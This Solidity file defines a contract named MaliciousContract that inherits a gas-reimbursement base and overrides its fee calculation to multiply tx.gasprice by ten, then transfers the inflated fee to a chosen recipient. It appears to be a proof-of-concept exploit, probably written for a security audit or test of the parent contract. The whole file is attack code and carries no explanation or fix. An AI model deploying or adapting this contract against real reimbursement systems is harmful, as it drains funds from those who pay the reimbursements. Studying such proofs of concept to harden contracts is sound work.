// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./gas-price.sol";

contract MaliciousContract is GasReimbursement {
    constructor() {}

    function calculateTotalFee() public view override returns (uint) {
        // Manipulate the tx.gasprice to an inflated value
        uint256 inflatedGasPrice = tx.gasprice * 10;
        uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * inflatedGasPrice;
        return totalFee;
    }

    function executeTransferWithManipulatedGas(address recipient) public {
        uint256 totalFee = calculateTotalFee();
        _nativeTransferExec(recipient, totalFee);
    }
}